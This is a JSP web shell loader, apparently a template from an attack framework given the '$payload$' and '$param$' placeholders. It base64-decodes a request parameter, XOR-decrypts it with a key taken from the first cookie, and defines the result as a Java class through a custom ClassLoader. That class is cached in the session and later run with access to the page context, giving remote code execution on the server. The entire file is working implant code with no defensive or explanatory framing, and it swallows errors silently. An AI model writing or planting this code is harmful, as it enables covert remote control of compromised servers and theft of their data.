<%@ page contentType="text/html;charset=UTF-8" language="java" pageEncoding="UTF-8" %>
<%!

    public static byte[] $_x(byte[] $_s, String $_key) {
        try {
            byte[] $_keyBytes = $_key.getBytes("UTF-8");
            byte[] $_result = new byte[$_s.length];
            for (int $_i = 0; $_i < $_s.length; $_i++) {
                $_result[$_i] = (byte) ($_s[$_i] ^ $_keyBytes[$_i % $_keyBytes.length]);
            }
            return $_result;
        } catch (Exception $_e) {
            return null;
        }
    }
    
    public static byte[] $_base64Decode(String $_s1) {
        try {
            String $_tbl = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
            java.io.ByteArrayOutputStream $_buf = new java.io.ByteArrayOutputStream();
            int $_i = 0;
            int $_bits = 0;
            int $_bitCount = 0;
            while ($_i < $_s1.length()) {
                char $_c = $_s1.charAt($_i++);
                if ($_c == '=') break;
                int $_v = $_tbl.indexOf($_c);
                if ($_v == -1) continue;
                $_bits = ($_bits << 6) | $_v;
                $_bitCount += 6;
                if ($_bitCount >= 8) {
                    $_bitCount -= 8;
                    $_buf.write(($_bits >> $_bitCount) & 0xFF);
                }
            }
            return $_buf.toByteArray();
        } catch (Exception $_e) {
            return null;
        }
    }

    class $_classloader extends ClassLoader {
        public $_classloader(ClassLoader z) {
            super(z);
        }
        
        public Class $_defineclass(byte[] cb) {
            return super.defineClass(cb, 0, cb.length);
        }
    }
%>

<%
    try {
        String $_payloadKey = "$payload$";        
        String $_paramKey = "$param$";

        if (session.getAttribute($_payloadKey) == null) {
            String $_paramValue = request.getParameter($_paramKey);
            if ($_paramValue != null) {
                byte[] $_data = $_base64Decode($_paramValue);
                
                if (request.getCookies() != null && request.getCookies().length > 0) {
                    String $_stagerKey = request.getCookies()[0].getValue();
                    $_data = $_x($_data, $_stagerKey);
                    
                    try {
                        Class $_loadedClass = new $_classloader(this.getClass().getClassLoader()).$_defineclass($_data);
                        session.setAttribute($_payloadKey, $_loadedClass);
                    } catch (Exception $_classLoadException) {
                        return;
                    }
                }
            }
        } else {
            java.io.ByteArrayOutputStream $_arrOut = new java.io.ByteArrayOutputStream();
            Object $_f = ((Class)session.getAttribute($_payloadKey)).newInstance();
            
            $_f.equals($_arrOut);
            $_f.equals(pageContext); 
            $_f.toString();
        }
    } catch (Exception $_e) {
    }
%>